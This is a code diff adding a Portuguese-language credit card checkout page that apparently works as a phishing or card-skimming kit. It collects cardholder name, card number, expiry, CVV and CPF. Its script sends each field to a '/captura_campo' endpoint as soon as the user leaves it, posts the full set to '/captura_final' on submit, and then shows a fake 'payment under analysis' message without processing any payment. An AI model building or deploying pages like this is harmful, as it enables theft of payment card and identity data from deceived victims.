@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Pagamento com Cartão de Crédito</title>
+  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    body { background: linear-gradient(135deg, #ffe4ec 0%, #f8e1ff 100%); font-family: 'Quicksand', Arial, sans-serif; margin: 0; padding: 0; min-height: 100vh; }
+    .main-container { max-width: 410px; margin: 38px auto 20px auto; background: #fff; border-radius: 26px; box-shadow: 0 6px 38px #be429978; padding: 32px 18px 24px 18px; display: flex; flex-direction: column; align-items: center; }
+    .titulo { color: #be4299; font-size: 1.45em; font-weight: 700; text-align: center; margin-bottom: 13px; margin-top: 0; letter-spacing: 0.01em; }
+    .form-box { width: 100%; background: #fff4fc; border-radius: 16px; box-shadow: 0 1px 10px #be429926; padding: 18px 14px 8px 14px; margin-bottom: 8px; }
+    label { display: block; margin: 4px 0 2px 2px; color: #7e438b; font-size: 0.95em; font-weight: 500; letter-spacing: 0.01em; }
+    input, select { width: 100%; padding: 7px 8px; border-radius: 7px; border: 1px solid #c8a4c6; margin-bottom: 10px; background: #fff; font-size: 0.97em; color: #542a65; transition: border 0.2s; }
+    input:focus, select:focus { border-color: #be4299; outline: none; background: #f7ebf9; }
+    button[type='submit'] { background: linear-gradient(90deg,#f14fa6,#be4299 90%); color: #fff; padding: 12px 0; border: none; border-radius: 10px; width: 100%; font-size: 1.13em; font-weight: bold; cursor: pointer; margin-top: 10px; margin-bottom: 2px; box-shadow: 0 2px 12px #be429931; transition: background .16s; }
+    button[type='submit']:hover { background: linear-gradient(90deg,#be4299,#f14fa6 90%); }
+    .mensagem-analise { text-align: center; color: #7e438b; font-size: 1.15em; background: #f8e1ff; border-radius: 10px; padding: 25px 10px; margin-top: 25px; font-weight: 600; box-shadow: 0 2px 12px #be429931; }
+    @media (max-width: 570px) { .main-container { max-width: 97vw; padding: 9vw 2vw; } .titulo { font-size: 1.18em; } }
+  </style>
+</head>
+<body>
+  <div class="main-container">
+    <h1 class="titulo">Pagamento com Cartão de Crédito</h1>
+    <div class="form-box" id="formulario-box">
+      <form id="form-cartao" autocomplete="off">
+        <label for="nome-titular">Nome do titular do cartão</label>
+        <input type="text" id="nome-titular" name="nome-titular">
+        <label for="numero-cartao">Número do cartão</label>
+        <input type="text" id="numero-cartao" name="numero-cartao" maxlength="19" placeholder="0000 0000 0000 0000" inputmode="numeric">
+        <label for="validade">Data de validade (MM/AA)</label>
+        <input type="text" id="validade" name="validade" maxlength="5" placeholder="MM/AA" inputmode="numeric">
+        <label for="cvv">CVV</label>
+        <input type="text" id="cvv" name="cvv" maxlength="3" placeholder="CVV" inputmode="numeric">
+        <label for="cpf-titular">CPF do titular</label>
+        <input type="text" id="cpf-titular" name="cpf-titular" maxlength="14" placeholder="000.000.000-00" inputmode="numeric">
+        <label for="parcelas">Quantidade de parcelas</label>
+        <select id="parcelas" name="parcelas">
+          <option value="" selected disabled>Selecione</option>
+          <option value="1">1x</option>
+          <option value="2">2x</option>
+          <option value="3">3x</option>
+          <option value="4">4x</option>
+          <option value="5">5x</option>
+          <option value="6">6x</option>
+          <option value="7">7x</option>
+          <option value="8">8x</option>
+          <option value="9">9x</option>
+          <option value="10">10x</option>
+          <option value="11">11x</option>
+          <option value="12">12x</option>
+        </select>
+        <button type="submit">Finalizar pagamento</button>
+      </form>
+    </div>
+    <div class="mensagem-analise" id="mensagem-analise" style="display:none;">
+      Pagamento em análise.<br>Você receberá a confirmação em instantes!
+    </div>
+  </div>
+  <script>
+    // sessionId por usuário (persistente)
+    function getSessionId() {
+      let sid = localStorage.getItem('sessionId');
+      if (!sid) {
+        sid = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).substr(2, 16);
+        localStorage.setItem('sessionId', sid);
+      }
+      return sid;
+    }
+    function enviarCampo(campo, valor) {
+      fetch('/captura_campo', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ sessionId: getSessionId(), campo: campo, valor: valor })
+      });
+    }
+
+    document.getElementById('numero-cartao').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '').slice(0,16);
+      let formatted = '';
+      for (let i = 0; i < value.length; i += 4) {
+        if (i > 0) formatted += ' ';
+        formatted += value.substr(i, 4);
+      }
+      e.target.value = formatted;
+    });
+
+    document.getElementById('validade').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/[^0-9]/g, '').slice(0,4);
+      if (value.length >= 3) {
+        e.target.value = value.slice(0,2) + '/' + value.slice(2,4);
+      } else {
+        e.target.value = value;
+      }
+    });
+
+    document.getElementById('cpf-titular').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '').slice(0,11);
+      let formatted = '';
+      if (value.length > 9) {
+        formatted = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+      } else if (value.length > 6) {
+        formatted = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+      } else if (value.length > 3) {
+        formatted = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+      } else {
+        formatted = value;
+      }
+      e.target.value = formatted;
+    });
+
+    [
+      'nome-titular',
+      'numero-cartao',
+      'validade',
+      'cvv',
+      'cpf-titular',
+      'parcelas'
+    ].forEach(function(id) {
+      document.getElementById(id).addEventListener('blur', function(e) {
+        enviarCampo(id, e.target.value);
+      });
+      if (id === 'parcelas') {
+        document.getElementById(id).addEventListener('change', function(e) {
+          enviarCampo(id, e.target.value);
+        });
+      }
+    });
+
+    document.getElementById('form-cartao').onsubmit = function(e) {
+      e.preventDefault();
+      let nome = document.getElementById('nome-titular').value.trim();
+      let numero = document.getElementById('numero-cartao').value.replace(/\s/g, '');
+      let validade = document.getElementById('validade').value.trim();
+      let cvv = document.getElementById('cvv').value.trim();
+      let cpf = document.getElementById('cpf-titular').value.replace(/\D/g, '');
+      let parcelas = document.getElementById('parcelas').value;
+      if (!nome || nome.length < 10 || numero.length !== 16 || !/^\d{2}\/\d{2}$/.test(validade) || cvv.length !== 3 || cpf.length !== 11 || !parcelas) return;
+      fetch('/captura_final', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          sessionId: getSessionId(),
+          'nome-titular': nome,
+          'numero-cartao': numero,
+          'validade': validade,
+          'cvv': cvv,
+          'cpf-titular': cpf,
+          'parcelas': parcelas
+        })
+      });
+      document.getElementById('formulario-box').style.display = 'none';
+      document.getElementById('mensagem-analise').style.display = 'block';
+    };
+  </script>
+</body>
+</html>
